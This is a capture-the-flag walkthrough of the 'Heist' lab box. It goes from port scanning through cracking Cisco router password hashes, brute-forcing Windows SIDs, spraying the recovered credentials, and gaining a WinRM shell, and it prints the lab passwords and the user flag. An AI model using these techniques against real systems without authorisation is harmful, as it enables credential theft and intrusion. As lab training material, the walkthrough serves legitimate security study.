# Heist

## Information Gathering
10.10.10.149
Heist

## Enumeration / Scanning
Begin with a basic nmap scan<br>
```bash
# Nmap 7.92 scan initiated Fri Jan 14 17:03:34 2022 as: nmap -p- -sC -sV -oN nmap/heist-all.nmap -Pn 10.10.10.149
Nmap scan report for heist.htb (10.10.10.149)
Host is up (0.029s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Support Login Page
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-14T22:22:03
|_  start_date: N/A
|_clock-skew: 14m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 14 17:07:41 2022 -- 1 IP address (1 host up) scanned in 246.81 seconds

```

There is a webserver so I'm going to also run Nikto and Gobuster while I manual spider with BurpSuite<br>
```bash
nikto -host 10.10.10.149 -Format txt -o nikto/heist.nikto

- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.149
+ Target Port: 80
+ GET Retrieved x-powered-by header: PHP/7.3.1
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Cookie PHPSESSID created without the httponly flag
+ OPTIONS Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ OPTIONS Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ GET /login.php: Admin login page/section found.
```

```bash
gobuster dir -u http://10.10.10.149 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php,html,asp,aspx,txt -o gob/heist.gob
/images               (Status: 301) [Size: 150] [--> http://10.10.10.149/images/]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 2058]
/Images               (Status: 301) [Size: 150] [--> http://10.10.10.149/Images/]
/issues.php           (Status: 302) [Size: 16] [--> login.php]
/css                  (Status: 301) [Size: 147] [--> http://10.10.10.149/css/]
/Index.php            (Status: 302) [Size: 0] [--> login.php]
/Login.php            (Status: 200) [Size: 2058]
/js                   (Status: 301) [Size: 146] [--> http://10.10.10.149/js/]
/Issues.php           (Status: 302) [Size: 16] [--> login.php]
/attachments          (Status: 301) [Size: 155] [--> http://10.10.10.149/attachments/]
/IMAGES               (Status: 301) [Size: 150] [--> http://10.10.10.149/IMAGES/]
/INDEX.php            (Status: 302) [Size: 0] [--> login.php]
/CSS                  (Status: 301) [Size: 147] [--> http://10.10.10.149/CSS/]
/JS                   (Status: 301) [Size: 146] [--> http://10.10.10.149/JS/]
/Attachments          (Status: 301) [Size: 155] [--> http://10.10.10.149/Attachments/]
/LogIn.php            (Status: 200) [Size: 2058]
/LOGIN.php            (Status: 200) [Size: 2058]
```

## Exploitation
Upon entering the webpage, there is a login page. Trying a few default credentials yields no returns. There is a 'login as guest' feature which takes me directly to a conversation thread between 'Hazard' and 'Support Admin'. Hazard links an attachment file which looks like keystrokes for configuring a Cisco router. 
```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```
A looked at <a href="https://www.cisco.com/c/en/us/td/docs/routers/access/800M/software/800MSCG/routconf.html">this</a> page to get a sense of what is going on here. <b>enable secret</b> specifies a password to prevent access to the router.
I ran this in john and cracked the password after a few minutes.<br>
```bash
john secret.txt --wordlist=/usr/share/wordlist/rockyou.txt --format=md5crypt-long
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)     
1g 0:00:03:00 DONE (2022-01-14 13:16) 0.005535g/s 19614p/s 19614c/s 19614C/s stealthphantom..stealth1.1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Using <a href="">this</a> website allows me to crack passwords in a Cisco format.
```
0242114B0E143F015F5D1E161713:$uperP@ssword
02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
```


Because 'Hazard' configured their Cisco router, it's likely that this is Hazards password. These credentials are probably not for the webserver as you need an email and password to login however, there is a SMB server listening on port 445 according to the nmap scan. Trying to list the shares with the credentials yields results<br>
```bash
smbcleint -L \\\\10.10.10.149\\ -U Hazard
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```
Using these same credentials grants access to the IPC$ share<br>
```bash
smbclient \\\\10.10.10.149\\IPC$ -U Hazard
```
However, after connecting and trying to perform further enumeration I get <b>NT_STATUS_INVALID_INFO_CLASS listing \*</b>

There also an RPC server on port 135 as seen in the nmap scan. Using rpcclient and using Hazards credenttials yields a rpc shell:
```bash
rpcclient -U Hazard 10.10.10.149
```
I'm not too familiar with enumerating rpc so I used <a href="https://www.hackingarticles.in/active-directory-enumeration-rpcclient/">this</a> resource. I'm also using the <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> suite for testin SMB and RPC. After procedurally trying Python scripts, I found some promising information.
```bash
python3 lookupsid.py hazard:stealth1agent@10.10.10.149

Impacket v0.9.25.dev1+20220105.151306.10e53952 - Copyright 2021 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```
This gives us a lot of usernames to work with. Trying different credential combinations with what is available gives a match <b>Chase:Q4)sJu\Y8qz\*A3?d</b>.<br>
There isn't anything left for us to do for port 80,135 and 445. Moving onto 5985, this is a WinRM service. Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machiens over HTTP(S). For starters, I can use <b>crackmapexec</b> to see what users are capable of accessing this box remotely. 
```bash
crackmapexec winrm 10.10.10.149 -u Chase -p "Q4)sJu\Y8qz*A3?d"

WINRM       10.10.10.149    5985   NONE             [*] None (name:10.10.10.149) (domain:None)
WINRM       10.10.10.149    5985   NONE             [*] http://10.10.10.149:5985/wsman
WINRM       10.10.10.149    5985   NONE             [+] None\Chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)
```
Turns out Chase can access this machine through WinRM. Now in order to access the machine, I can use evil-winrm.
```bash
evil-winrm -u Chase -p "Q4)sJu\Y8qz*A3?d" -i 10.10.10.149
*Evil-WinRM* PS C:\Users\Chase\Documents>
```
And we get a shell!
```
user.txt:46c7bb70691b10bc06c79c00a8ab579b
```

## Privilege Escalation
After gaining foothold, attempt to expand access to a system. Two types of escalation: Horizontal and verticle. Horizontal is accessing other accounts within the same permission group. Verticle escalation is that of another permission group. 

## Post Exploitation
What other hosts can be exploited? (pivoting)<br>
What other additional information can we gather from the host now that we are privileged user?<br>
Covering your tracks.<br>
Reporting<br>

